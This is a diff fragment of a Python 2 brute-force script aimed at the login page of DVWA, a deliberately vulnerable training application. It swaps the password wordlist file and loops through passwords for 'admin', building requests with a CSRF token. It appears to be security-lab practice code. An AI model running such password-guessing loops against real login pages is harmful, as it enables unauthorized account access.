@@ -265,7 +265,7 @@ def get_token(requrl,header):
 
 user_token = get_token(requrl,header)
 i=0
-for line in open("rkolin.txt"):
+for line in open("password.txt"):
 	requrl = "http://<改成你自己机器IP!!!>/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
 	i = i+1
 	print i,'admin',line.strip(),
